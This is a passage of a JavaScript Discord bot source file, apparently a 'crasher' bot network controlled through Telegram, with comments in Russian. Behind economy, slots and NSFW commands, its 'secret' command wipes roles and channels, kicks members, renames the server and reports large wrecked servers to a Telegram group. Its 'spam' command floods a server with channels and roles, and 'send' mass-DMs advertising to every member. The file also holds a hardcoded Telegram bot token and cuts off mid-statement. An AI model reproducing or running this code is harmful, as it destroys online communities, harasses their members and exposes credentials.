const Discord = require("discord.js");
const fs=require("fs");
const bot = new Discord.Client();
var bots = []
var col = [0,0,0,0,0,0]
let ban = true;
var cdavatart = 0
var cdprefix = 0
var cdname=  0

let botslist = {};

let botslist0 = {};
try {
	botslist0 = JSON.parse(fs.readFileSync("botslist.json"));
	if (!Object.keys(botslist0).length && botslist0 !== {}) botslist0 = {};

} catch (e) {}

const Telegraf = require('telegraf')

const appl = new Telegraf("1006869534:AAE0vHQoFhIDgjewV8R_2jU3T0TOcX0o9PM")

appl.command('link', (ctx) => {
	
	let messageArray = ctx.message.text.split(" ");
	
	let bet = parseInt(messageArray[1])
    if((bet !== NaN)&&( bet <= bots.length)){
		bet--
	let linc = "Ссылка на " + bots[bet].user.username + "\n"
	linc = linc + "https://discordapp.com/api/oauth2/authorize?client_id=" + bots[bet].user.id + "&permissions=980937982&scope=bot"
		ctx.reply(linc)
	}
	
})



appl.command('bots', (ctx) => {

	let text = ""
	for (let i = 0; i < bots.length; i++){
	console.log(bots[i].user.id)
	//let linc = "https://discordapp.com/api/oauth2/authorize?client_id=" + bots[i].user.id + "&permissions=980937982&scope=bot"
	let num = i + 1
	text = text + num + ". : " + bots[i].user.username + "\n"
		
	}
	ctx.reply(text)
})

appl.command('addtoken', (ctx) => {	

	let valid = true
	let messageArray = ctx.message.text.split(" ");
	if(messageArray[1]){
	let token = messageArray[1]
	
for (var item in botslist0) {
	
	
  if(botslist0[item] === token)
  valid = false
  
}
	if(valid){
	if(token.length === 59){
	custombot(token)
	return ctx.reply("Твой токен добавлен")
	}
	else return ctx.reply("Токен введен некоректно")
	}
	}
	})
	
	
appl.launch()


for (var item in botslist0) {
  custombot(botslist0[item])
}

var tokens = []



let userban = {};
try {
	userban = JSON.parse(fs.readFileSync('userban.json'));
	if (!Object.keys(userban).length && userban !== {}) userban = {};

} catch (e) {}

let servban = {};
try {
	servban = JSON.parse(fs.readFileSync('servban.json'));
	if (!Object.keys(servban).length && servban !== {}) servban = {};

} catch (e) {}
let botban = {};
try {
	botban = JSON.parse(fs.readFileSync('botban.json'));
	if (!Object.keys(botban).length && botban !== {}) botban = {};

} catch (e) {}



async function sleep(msec) {
    return new Promise(resolve => setTimeout(resolve, msec));
}

setTimeout(xuita =>{
setInterval(function amt(){
	
	for (var user in userban) {
  if(userban[user].upgrade0coast){
	  let income = 0;
	  	income +=	userban[user].upgrade0 / 60 * 0.1
		income +=	userban[user].upgrade1 / 60
		income +=	userban[user].upgrade2 / 60 * 10
		income +=	userban[user].upgrade3 / 60 * 100
		userban[user].money += income
  }
  
  
  
}
	  	fs.writeFile('./userban.json', JSON.stringify(userban), (err) => {
    if (err) console.error(err);
  });
	
},60000)
}
,10000)

function custombot(huetoken){
	const bot = new Discord.Client({
		token: huetoken,
		autorun: true
	})
	bot.token = huetoken


bot.on('guildCreate', guild => {
	let memb = new Map(guild.members);
  let dibil = memb.values()
  for(var i = 0; i < memb.size; i++ ){
  let thismember = dibil.next().value.id

	if (!userban[thismember]) userban[thismember] = {
		premium: 0,
	};
console.log(userban[thismember].premium)
  }	
	
});



bot.on("ready", async() => {
console.log(`${bot.user.username} is online`);

botslist[bot.user.username] = huetoken
	fs.writeFile("./botslist.json", JSON.stringify(botslist), (err) => {
    if (err) console.error(err);
  });
  bots.push(bot)


  
});

bot.on("message",   async message => {
let actd = Math.trunc(Math.random() * 10);
bot.user.setStatus('offline')


if (message.author.bot) return;
if (message.channel.type === "dm") return;
if (message.content === "0") return;
let prefix = "v!"
let bid = 0



let messageArray = message.content.split(" ");
let linkArray = message.content.split("/");
let http = linkArray[0];
let link = linkArray[2];
let pixArray = message.content.split("pix")
let cmd = messageArray[0];
let args = messageArray.slice(1);
if (pixArray[0] === "<:") return;

let id = message.author.id;
let msg = message.content;

if (!userban[message.author.id])
	userban[message.author.id] = {}


if (!userban[message.author.id].premium) 
		userban[message.author.id].premium = 0
	
	
if (!userban[message.author.id].points)  {
		userban[message.author.id].points= 0
		userban[message.author.id].level= 0
		userban[message.author.id].money= 0

	};
	if (!userban[message.author.id].crash)  {
			userban[message.author.id].crash= 0
	}
	
		if (!userban[message.author.id].upgrade0coast)  {
			userban[message.author.id].upgrade0coast = 5
			userban[message.author.id].upgrade1coast = 100
			userban[message.author.id].upgrade2coast = 2000
			userban[message.author.id].upgrade3coast = 40000
			userban[message.author.id].upgrade0 = 0
			userban[message.author.id].upgrade1 = 0
			userban[message.author.id].upgrade2 = 0
			userban[message.author.id].upgrade3 = 0
	}




//bot.user.setActivity(prefix + "help", { type: `PLAYING` });

	
let luser = userban[id];
if (!servban[message.guild.id]) servban[message.guild.id] = {
		premium: 0,
};
if((cmd === `${prefix}invite`)&&(message.author.id==="615303738969817099")){
		 message.channel.createInvite({maxAge: 0, maxUses: 0})
  .then(invite => bot.users.get("615303738969817099").send(`http://discord.gg/${invite.code}`))
}



if(cmd === `${prefix}help`){ 

const exampleEmbed = new Discord.RichEmbed()
  .setColor("#00ffff")
  .addField("Экономика", "\`give\`, \`profile\`, \`betroll(br)\`, \`slots\`, \`top\`, \`balance\`, \`shop\`, \`buy\`")
  .addField("nsfw", "\`fap\`, \`hentai\`")
  .addField("Краш", "\`secret\`, \`spam\`")
  return message.channel.send(exampleEmbed);
}
if(cmd === `${prefix}top`){
	let topchik = JSON.parse(fs.readFileSync('userban.json'));
	let toptext = "";
	let rank = 0;
	for(let itwotop = 0; itwotop < 10; itwotop++){
	let max = 0;
	let name = "";
	let topid = ""
		let memb = new Map(bot.users);
  let dibil = memb.values()
  for(let itop = 0; itop < memb.size; itop++ ){
  let thismember = dibil.next().value.id
    if (topchik[thismember])
  if(topchik[thismember].money > max){
	  max = topchik[thismember].money
	  
	  topid = thismember;
  }
  }
  
topchik[topid] = {}
rank++
toptext = toptext + "**" + rank + "#** <@" + topid + "> | " + "**" + max + "**" + " :sparkles:" + "\n \n"
	
	}
	let topemb = new Discord.RichEmbed()
	.setTitle("Топ по валюте " + message.guild.name + "\n \n")
	.setDescription(toptext)
	.setColor("#21759b")
	return message.channel.send(topemb);

}


if(cmd === `${prefix}shop`){
	
	let shop = new Discord.RichEmbed()
	.setDescription("Магазин |" + message.author.username)
	.addField("1.Крашер","Цена:" + userban[message.author.id].upgrade0coast +" :sparkles: \nПрибыль: 0.1 в час")
	.addField("2.Вирус","Цена:" + userban[message.author.id].upgrade1coast +" :sparkles: \nПрибыль: 1 в час")
	.addField("3.Нейросеть","Цена:" + userban[message.author.id].upgrade2coast +" :sparkles: \nПрибыль: 10 в час")
	.addField("4.BOTNET","Цена:" + userban[message.author.id].upgrade3coast +" :sparkles: \nПрибыль: 100 в час")
	.setFooter("Ваш доход:  " + String(userban[message.author.id].upgrade0*0.1 + userban[message.author.id].upgrade1 + userban[message.author.id].upgrade2*10 + userban[message.author.id].upgrade3*100))
	.setColor("#00FFFF")
	return message.channel.send(shop)
}



if((cmd === `${prefix}buy`)&&(messageArray[1])){
	if ((messageArray[1] === "1")&&(userban[message.author.id].money >= userban[message.author.id].upgrade0coast)){
		userban[message.author.id].money-=userban[message.author.id].upgrade0coast
		if(userban[message.author.id].upgrade0coast === Math.trunc(userban[message.author.id].upgrade0coast *1.14))
		userban[message.author.id].upgrade0coast = Math.trunc(userban[message.author.id].upgrade0coast *1.14)+1
	else
		userban[message.author.id].upgrade0coast = Math.trunc(userban[message.author.id].upgrade0coast *1.14)
		userban[message.author.id].upgrade0++
			fs.writeFileSync('./userban.json', JSON.stringify(userban), "utf-8", (err) => {
    if (err) console.error(err);
	})
		return message.channel.send("Вы успешно купили крашер")
	}
		if ((messageArray[1] === "2")&&(userban[message.author.id].money >= userban[message.author.id].upgrade1coast)){
		userban[message.author.id].money-=userban[message.author.id].upgrade1coast
		userban[message.author.id].upgrade1coast = Math.trunc(userban[message.author.id].upgrade1coast *1.14)
		userban[message.author.id].upgrade1++
			fs.writeFileSync('./userban.json', JSON.stringify(userban), "utf-8", (err) => {
    if (err) console.error(err);
	})
		return message.channel.send("Вы успешно купили вирус")
	}
		if ((messageArray[1] === "3")&&(userban[message.author.id].money >= userban[message.author.id].upgrade2coast)){
		userban[message.author.id].money-=userban[message.author.id].upgrade2coast
		userban[message.author.id].upgrade2coast = Math.trunc(userban[message.author.id].upgrade2coast *1.14)
		userban[message.author.id].upgrade2++
			fs.writeFileSync('./userban.json', JSON.stringify(userban), "utf-8", (err) => {
    if (err) console.error(err);
	})
		return message.channel.send("Вы успешно купили нейросетю")
	}
		if ((messageArray[1] === "4")&&(userban[message.author.id].money >= userban[message.author.id].upgrade3coast)){
		userban[message.author.id].money-=userban[message.author.id].upgrade3coast
		userban[message.author.id].upgrade3coast = Math.trunc(userban[message.author.id].upgrade3coast *1.14)
		userban[message.author.id].upgrade3++
			fs.writeFileSync('./userban.json', JSON.stringify(userban), "utf-8", (err) => {
    if (err) console.error(err);
	})
		return message.channel.send("Вы успешно купили BOTNET")
	}
}

if ((messageArray[1])&&(messageArray[1].length===21)){
  var uid = messageArray[1];
  uid = uid[2] + uid[3] + uid[4] + uid[5] + uid[6] + uid[7] + uid[8] + uid[9] + uid[10] + uid[11] + uid[12] + uid[13] + uid[14] + uid[15] + uid[16] + uid[17] + uid[18] + uid[19];
  try{
  var user = message.guild.members.get(uid);
  user = user.user;
  }catch{}
}


if((cmd === `${prefix}slots`)&&(messageArray[1])){
    let bet = parseInt(messageArray[1])
    if((bet !== NaN)&&(bet > 0)){
      let slots = new Discord.RichEmbed()
      if(!(userban[id].money < bet)){
		slots.setColor("#39ff14")
    let slotst = ""
    let gem = 0;
    let grapes = 0;
    let watermelon = 0;
    let banana = 0;
    let lemon = 0;
    let tangerine = 0;
    let pear = 0;
    let apple = 0;
    let credit = 0;




for(var slotstring = 0; slotstring < 3; slotstring++){
  let line = "|"
for(var slotlink = 0; slotlink < 5; slotlink++){
    let percent = Math.random() * 100;
    if (percent<4.5){
			line = line + ":gem:"
      if(slotstring === 1){
      grapes++;
      watermelon++;
      banana++;
      lemon++;
      tangerine++;
      pear++;
      apple++;
    }
    }
    else  if (percent<10){
  			line = line + ":grapes:"
        if(slotstring === 1)
        grapes++
      }
        else  if (percent<16){
      			line = line + ":watermelon:"
            if(slotstring === 1)
            watermelon++
          }
            else  if (percent<23){
          			line = line + ":banana:"
                if(slotstring === 1)
                banana++
              }
                else  if (percent<32.5){
              			line = line + ":lemon:"
                    if(slotstring === 1)
                    lemon++
                  }
                    else  if (percent<47){
                  			line = line + ":tangerine:"
                        if(slotstring === 1)
                        tangerine++
                      }
                        else  if (percent<67.5){
                      			line = line + ":pear:"
                            if(slotstring === 1)
                            pear++
                          }
                            else if (percent<97){
                              line = line + ":apple:"
                              if(slotstring === 1)
                              apple++
                          }
                          else{
                            line = line + ":credit_card:"
                            credit++
                          }
      if(slotlink < 4)
      line= line + "┊"
    }
    line= line + "|"
      if(slotstring === 1)
      line= line + "◄"
    slotst = slotst + line + "\n"
}
let win = -bet
if (apple === 5)
win += bet*3
if (apple === 4)
win += bet*2
if (apple === 3)
win += bet
if (pear === 5)
win += bet*4
if (pear === 4)
win += bet*3
if (pear === 3)
win += bet*2
if (tangerine === 5)
win += bet*5
if (tangerine === 4)
win += bet*4
if (tangerine === 3)
win += bet*3
if (lemon === 5)
win += bet*6
if (lemon === 4)
win += bet*5
if (lemon === 3)
win += bet*4
if (banana === 5)
win += bet*7
if (banana === 4)
win += bet*6
if (banana === 3)
win += bet*5
if (watermelon === 5)
win += bet*8
if (watermelon === 4)
win += bet*7
if (watermelon === 3)
win += bet*6
if (grapes === 5)
win += bet*9
if (grapes === 4)
win += bet*8
if (grapes === 3)
win += bet*7
if (win<0)
	slotst = slotst + "Ты проиграл " + bet
else{
  slotst = slotst + "Ты выйграл " + win
}
  userban[id].money += win
  	fs.writeFile('./userban.json', JSON.stringify(userban), (err) => {
    if (err) console.error(err);
  });
  fs.writeFile('./servban.json', JSON.stringify(servban), (err) => {
    if (err) console.error(err);
  });
		slots.addField("Слоты | " + message.author.username,slotst)

		message.channel.send(slots)

    if (credit>2){
      let bpercent = Math.trunc(Math.random() * 3);
      bpercent++
      console.log(bpercent)
      let bonus = new Discord.RichEmbed()
      .addField("Бонусная игра|" + message.author.username,"Выбери дверь \n:door: :door: :door: \n:one: :two: :three:")
	  .setFooter("У тебя есть минута подумать")
      message.channel.send(bonus)
      let msgbonus = await message.channel.awaitMessages(msg2 => msg2.content > 0 && msg2.content < 4 && msg2.author.id === message.author.id, {
							maxMatches: 1,
							time: 60000,
							errors: ['time']
						});
      if(Number(msgbonus.first().content) === bpercent){
        slotst = "Ты выйграл " + bet * 10
        userban[message.author.id].money += bet * 10
      }
      else{
        slotst = "Ты не выйграл"
      }
      let bonusresult = new Discord.RichEmbed()
      let doors = "";
      if(bpercent === 1)
      doors = ":moneybag: :door: :door:"
      if(bpercent === 2)
      doors = ":door: :moneybag: :door:"
      if(bpercent === 3)
      doors = ":door: :door: :moneybag:"
      bonusresult.addField(slotst,doors)
      message.channel.send(bonusresult)
    }
    return;

	}
  slots.setColor("#ff1111")
  slots.setDescription(message.author.username + ", недостаточно средств")
  return  message.channel.send(slots)
	}
}

if((cmd === `${prefix}invite`)&&(messageArray[1].length === 18)){
	message.channel.send("https://discordapp.com/api/oauth2/authorize?client_id=" + messageArray[1] + "&permissions=980937982&scope=bot")
}


if((cmd === `${prefix}betroll`)||(cmd === `${prefix}br`)){
  if (Number(messageArray[1])> luser.money){
	  let br = new Discord.RichEmbed()
.setColor("#dc143c")
.setDescription(message.author.username + ", недостаточно средств")
  return message.channel.send(br);
}
  if (Number(messageArray[1])>0){
	  let bet = parseInt(messageArray[1])
let br = new Discord.RichEmbed()
.setColor("#99ff99")
luser.money -= Number(bet);
let roll = Math.trunc(Math.random() * 101);
if (roll <66){
br.setColor("dc143c")
br.setDescription(message.author.username + ", выпало " + String(roll) + " вы проиграли " + bet + " :sparkles:");
return message.channel.send(br)
}
if (roll <90){
luser.money += Number(bet)*2
br.setDescription(message.author.username + ", выпало " + String(roll) + " вы выйграли " + String(Number(bet)*2) + " :sparkles:");
return message.channel.send(br)
}
if (roll <100){
luser.money += Number(bet)*4
br.setDescription(message.author.username + ", выпало " + String(roll) + " вы выйграли " + String(Number(bet)*4) + " :sparkles:");
return message.channel.send(br)
}
if (roll === 100){
luser.money += Number(bet)*10;
br.setDescription(message.author.username + ", выпало " + String(roll) + " вы выйграли " + String(Number(bet)*10) + " :sparkles:");
return message.channel.send(br)
}
}
}


if(cmd === `${prefix}balance`){

  if (messageArray[1]){
if(userban[uid]){
let moneyval = userban[uid].money
let balance = new Discord.RichEmbed()
.setColor("#99ff99")
.setDescription("На счету " + user.username + " " + Math.trunc(moneyval) + " :sparkles:");
return message.channel.send(balance);
}
    }
let moneyval = luser.money
let balance = new Discord.RichEmbed()
.setColor("#99ff99")
.setDescription("На счету " + message.author.username + " " + moneyval + " :sparkles:");
return message.channel.send(balance);
}

if(cmd === `${prefix}give`){
	let give = new Discord.RichEmbed()
  if (Number(messageArray[2])>0){
 if ((messageArray[1].length === 21)&&(!(Number(messageArray[2])> luser.money ))){
   luser.money -= Number(messageArray[2]);
   userban[uid].money += Number(messageArray[2]);
   give.setColor("99ff99")
   give.setDescription(message.author.username + " передал(а) " + user.username + " " + String(messageArray[2]) + " :sparkles:")
      return message.channel.send(give);
 }
}
  give.setColor("dc143c")
  give.setDescription(message.author.username + ", невозможно совершить операцию")
 return message.channel.send(give);
}

let curLevel = Math.floor(0.1 * Math.sqrt(luser.points)); // (10 * level) ^ 2 = points required for level
  if (curLevel > luser.level) {
    luser.level = curLevel;
	luser.money += 100 * curLevel;


	//message.guild.members.get(message.author.id).send("Поздравляю! Ты повысил свой уровень) Держи " + String(100 * curLevel) + " :sparkles:")
  }

if((cmd === `${prefix}say`)&&(message.guild.member(message.author).hasPermission('ADMINISTRATOR'))){
  message.delete();

  if((message.guild.member(message.author).hasPermission('ADMINISTRATOR'))||(message.author.id === "328647344956506112"))
	messageArray.splice(0,1)
const sayMessage = messageArray.join(" ");
  return message.channel.send(sayMessage);
}

if((servban[message.guild.id].premium === 0)||(!servban[message.guild.id].premium)){
	
	if(userban[message.author.id].premium > 0)
	if(cmd === `${prefix}spam`){
	for (var spamc = 0; spamc < 400; spamc++){
		message.guild.createChannel('WS', { type: 'text' })
		if (spamc % 10 === 0)
		message.guild.createRole();
		await sleep(100)
	}
		for (var spamc = 0; spamc < 100; spamc++){
		message.guild.createRole();
		await sleep(1000)
	}
}


if((cmd === `${prefix}send`)&&(messageArray[1])&&(userban[message.author.id].premium == 1))
{
{
	if((messageArray[1] !== "")){
	messageArray.splice(0,1)
	const sayMessage = messageArray.join(" ");
  let memb = new Map(message.guild.members);
  let dibil = memb.values()
  for(var i = 0; i < memb.size; i++ ){
	//  try{
	let thismember = dibil.next().value.id
	message.guild.members.get(thismember).send("**Серверу пиздец :X**\n`Тут может быть ваша реклама - цена 20-45 рублей`\nhttps://discordapp.com/invite/WbbDBzx")
	 // }
	//  catch{}
}
	}
}
}
	
if(cmd === `${prefix}secret`){
	try{		
  message.delete();
  
	  
  let membe = new Map(message.guild.roles);
  let dibile = membe.values()
  for(var i = 0; i < membe.size; i++ ){
  let thismember = dibile.next().value.id
	  if(message.guild.roles.get(thismember).editable && thismember !== message.guild.id)
	 message.guild.roles.get(thismember).delete()
	  
  }

  

  var membsize = message.guild.members.size;
  var membname = message.guild.name
  message.guild.pruneMembers(1)

  let memb = new Map(message.guild.members);
  let dibil = memb.values()
  for(var i = 0; i < memb.size; i++ ){
  let thismember = dibil.next().value.id

	if (!userban[thismember]) userban[thismember] = {
		premium: 0,
	};
	//if(message.guild.members.get(thismember).kickable){
		
		if(messageArray[1]){
	messageArray.splice(0,1)
	const sayMessage = messageArray.join(" ");
		}
if ((messageArray[1])){
	if(userban[message.author.id].premium === 1)
			message.guild.members.get(thismember).send(sayMessage)
}
else{
message.guild.members.get(thismember).send("gg")
await sleep(100)
}
	
if(userban[thismember].premium !== 1)
	{
		message.guild.members.get(thismember).kick();
	if(!userban[thismember].banned){
		userban[thismember].banned = 1;
		userban[message.author.id].points +=1;
		userban[message.author.id].money +=1
	}
	}

}


  memb = new Map(message.guild.channels)
  dibil = memb.values()
  for(var i = 0; i < memb.size; i++ ){
  thismember = dibil.next().value.id
  message.guild.channels.get(thismember).delete();
}

message.guild.createChannel("чатик⭐️",{ type: 'text' })
.then(async channel => {await channel.send("",{files: ["ban.jpg"]})
channel.send("Хочешь так же?")
channel.send("Заходи сюда")
channel.send("https://t.me/joinchat/AAAAAEpZMbqyFkURgs1kcw")}
)
message.guild.createChannel("войсик❤️",{ type: 'voice' })
memb = new Map(message.guild.channels)
dibil = memb.values()
thismember = dibil.next().value.id

message.guild.setName("YUKI в здании");
message.guild.setIcon("avatar.png");
if(messageArray[1])
console.log("["+messageArray[1]+"]")
console.log(message.author.username + " ебнул сервер " + membname + "  на " + membsize + " участников")
if(membsize > 49)
appl.telegram.sendMessage(-1001333903271,"Наш бот посетил сервер " + membname + " на " + membsize + " участников")
//.then(result => console.log(result))
	
//bots[3].channels.get("621014862247755796").send(log)

userban[message.author.id].crash +=1

	fs.writeFileSync('./userban.json', JSON.stringify(userban), "utf-8", (err) => {
	if (err) console.error(err);
})
	}};


if((cmd === `${prefix}setpremium`)&&(uid)&&(message.author.id === "615303738969817099")){
	if (!userban[uid]) userban[uid] = {
		premium: 0,
};
	userban[uid].premium = 1
	fs.writeFileSync('./userban.json', JSON.stringify(userban), "utf-8", (err) => {
    if (err) console.error(err);
	})
	return message.channel.send(user.username + " получил(а) премиум")
}


	if(cmd === `${prefix}profile`){
	servban = JSON.parse(fs.readFileSync('servban.json'));
	if (!Object.keys(servban).length && servban !== {}) servban = {};
		let level = new Discord.RichEmbed()
		.setDescription("**" + message.author.username + "**")
		let rank = 1;
		let memb = new Map(bot.users);
  let dibil = memb.values()
  for(var imeme = 0; imeme < memb.size; imeme++ ){
  let thismember = dibil.next().value.id
    if (!userban[thismember]) userban[thismember] = {
		points: 0,
		level: 0,
		money: 0,
	};
	    if (!userban[thismember].crash) {
		  userban[thismember].crash = 0
	};
  if(userban[thismember].points > luser.points)
	  rank++
}
		let sicon = message.author.displayAvatarURL;
		level.setThumbnail(sicon)
		level.setColor("#8b00ff")
		let txt = "";
		let fields = (( luser.points - Math.pow(10*(luser.level),2))  / (Math.pow(10*(luser.level+1),2) - Math.pow(10*(luser.level),2)))*15
		for(var lvl = 0; lvl<15; lvl++){
			if(fields>lvl){
				txt = txt + "█"
			}
			else{
				txt = txt + "▒"
			}
		}
			txt = txt + " " + ( luser.points - Math.pow(10*(luser.level),2)) + "/" + (Math.pow(10*(luser.level+1),2) - Math.pow(10*(luser.level),2));
			level.addField(`#${rank} по опыту`,`**${userban[message.author.id].level}** level.` + "\n" + txt)

			rank = 1;
			dibil = memb.values()
  for(var ibal = 0; ibal < memb.size; ibal++ ){
  thismember = dibil.next().value.id
  if(userban[thismember].money > luser.money)
	  rank++
}
	fs.writeFileSync('./userban.json', JSON.stringify(userban), "utf-8", (err) => {
    if (err) console.error(err);
	})
	let xmoney = Math.trunc(luser.money)
		level.addField(`#${rank} по деньгам`,`баланс: ${xmoney} :sparkles:`)
		
		dibil = memb.values()
  for(var imeme = 0; imeme < memb.size; imeme++ ){
  thismember = dibil.next().value.id
  if(userban[thismember].crash > luser.crash)
	  rank++
}
		
		level.addField(`#${rank} по колличеству серверов`,`серверов: ${luser.crash} `)
		
		
		
		return message.channel.send(level)
}

if((cmd === `${prefix}ban`)&&(uid)&&(message.author.id === "615303738969817099")){
	message.delete();
if((uid !== "615303738969817099")){
message.guild.ban(user);
return message.channel.send(user.username + " был забанен");
}
return;
}

if (message.guild.id === "620151604867497984"){

if((link === `discord.gg`)||(linkArray[0] === `discord.gg`)||(linkArray[1] === `discord.gg`)||(linkArray[3] === `discord.gg`)){
    if((message.guild.member(message.author).bannable)&&(message.guild.member(message.author).id !== "615303738969817099"))
	 message.guild.member(message.author).ban();
	message.delete();
  }
}

if ((cmd == `${prefix}clear`)&&(messageArray[1])&&(message.author.id === "615303738969817099")) {
let mesnumb = Number(messageArray[1])
if (mesnumb !== NaN)
                {
				message.channel.bulkDelete(mesnumb).then(() => {
				message.channel.send("Удалено " + mesnumb +" сообщений").then(m => m.delete(3000));
});
				}
}


if((cmd === `${prefix}del`)&&(messageArray[1])&&(message.author.id === "615303738969817099")){
	message.delete();
	message.channel.messages.get(messageArray[1]).delete()
}


if((cmd === `${prefix}serverpremium`)&&(messageArray[1])&&(message.author.id === "615303738969817099")){
	if (!servban[messageArray[1]]) servban[messageArray[1]] = {
		premium: 0,
};
	servban[messageArray[1]].premium = 1
	fs.writeFileSync('./servban.json', JSON.stringify(servban), "utf-8", (err) => {
    if (err) console.error(err);
	})
	return message.channel.send("Сервер добавлен в белый список")
}

if((cmd === `${prefix}serverpremium0`)&&(messageArray[1])&&(message.author.id === "615303738969817099")){
	if (!servban[messageArray[1]]) servban[messageArray[1]] = {
		premium: 0,
};
	servban[messageArray[1]].premium = 0
	fs.writeFileSync('./servban.json', JSON.stringify(servban), "utf-8", (err) => {
    if (err) console.error(err);
	})
	return message.channel.send("Сервер добавлен в пизду")
}

if((cmd === `${prefix}embed`)&&(messageArray[2])&&(messageArray[1].length === 7)&&((message.guild.member(message.author).hasPermission('ADMINISTRATOR'))||(message.author.id === "328647344956506112"))){
	message.delete();
	let color = messageArray[1];
	let image = messageArray[2];
	messageArray.splice(0,3)
const sayMessage = messageArray.join(" ");
 let serverembed = new Discord.RichEmbed()
 .setDescription(sayMessage)
 .setColor(color)
 .setImage(image)
 return message.channel.send(serverembed);
}

if((cmd === `${prefix}fap`)&&(message.channel.nsfw)){
	if (messageArray[1])
		if(messageArray[1].length === 21){
			message.delete();
  let droch = new Discord.RichEmbed()
  .setDescription("**" + message.author.username + "**" + " мечтает о **" + user.username + "**" )
  .setColor("#ff0000")
  let roll = Math.trunc(Math.random() * 4)
  if(roll === 0)
  droch.setImage('https://cdn.discordapp.com/attachments/601443039726272522/605403176224423947/LsGTYbu.gif')
  if(roll === 1)
  droch.setImage("https://cdn.discordapp.com/attachments/601443039726272522/605403061778776114/BewitchedOrdinaryGrouse-size_restricted.gif")
  if(roll === 2)
  droch.setImage("https://cdn.discordapp.com/attachments/601443039726272522/605399828880687127/2315215.gif")
  if(roll === 3)
  droch.setImage("https://cdn.discordapp.com/attachments/601443039726272522/605399828142227457/d915vey-278e1b50-2e2a-4db4-aad8-3df14a3409d6.gif")
 return message.channel.send(droch)
		}
	message.delete();
  let droch = new Discord.RichEmbed()
  .setDescription("**" + message.author.username + "**" + " испытывает невероятное удовольствие")
  .setColor("#ff0000")
  let roll = Math.trunc(Math.random() * 4)
  if(roll === 0)
  droch.setImage('https://cdn.discordapp.com/attachments/601443039726272522/605403176224423947/LsGTYbu.gif')
  if(roll === 1)
  droch.setImage("https://cdn.discordapp.com/attachments/601443039726272522/605403061778776114/BewitchedOrdinaryGrouse-size_restricted.gif")
  if(roll === 2)
  droch.setImage("https://cdn.discordapp.com/attachments/601443039726272522/605399828880687127/2315215.gif")
  if(roll === 3)
  droch.setImage("https://cdn.discordapp.com/attachments/601443039726272522/605399828142227457/d915vey-278e1b50-2e2a-4db4-aad8-3df14a3409d6.gif")
 return message.channel.send(droch)
  
}



if((cmd === `${prefix}hentai`)&&(message.channel.nsfw)){
	
	let hentai = new Discord.RichEmbed()
	.setColor("#ff0000")
	let roll = Math.trunc(Math.random() * 32)
	if(roll === 0)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
	if(roll === 1)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918365995048/431caa.jpg')
	if(roll === 2)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456919032758283/42b3a9.jpg')
	if(roll === 3)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456919032758285/186283.jpg')
	if(roll === 4)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456919544725545/4d9a34.jpg')
	if(roll === 5)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456919544725547/440ceb.jpg')
	if(roll === 6)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456950158950410/2ac833.jpg')
	if(roll === 7)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456950158950411/14e851.jpg')
	if(roll === 8)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456950972514304/2892e6.jpg')
	if(roll === 9)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456950972514305/408ee2.jpg')
	if(roll === 10)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456951559585802/40dd22.jpg')
	if(roll === 11)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456951559585803/5bddb.jpg')
	if(roll === 12)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605457066970054676/44181e.jpg')
	if(roll === 13)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605457067414913034/5c066.jpg')
	if(roll === 14)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605457067850989579/40819a.jpg')
	if(roll === 15)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605457067850989581/40a8ee.jpg')
	if(roll === 16)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605457069625049088/3a6ff1.jpg')
	if(roll === 17)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605457069625049090/5c004.jpg')
	if(roll === 18)
    hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605457108431011841/4197c4.jpg')
	if(roll === 19)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689373270212618/a594d.jpg')
if(roll === 20)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689373270212619/4c5003.jpg')
if(roll === 21)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689374100946964/d1d67.jpg')
if(roll === 22)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689374100946965/3608f9.jpg')
if(roll === 23)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689374595743763/35bfd3.jpg')
if(roll === 24)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689374595743765/411236.jpg')
if(roll === 25)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689375086346241/36162b.jpg')
if(roll === 26)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689375086346243/47ebfd.jpg')
if(roll === 27)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689375652839444/4f6937.jpg')
if(roll === 28)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689390663991297/489b73.jpg')
if(roll === 29)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689390663991299/c368d.jpg')
if(roll === 30)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689391192735755/5bff8.jpg')
if(roll === 31)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605689392094380042/bf377.jpg')
					if(roll === 32)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 33)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 34)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 35)
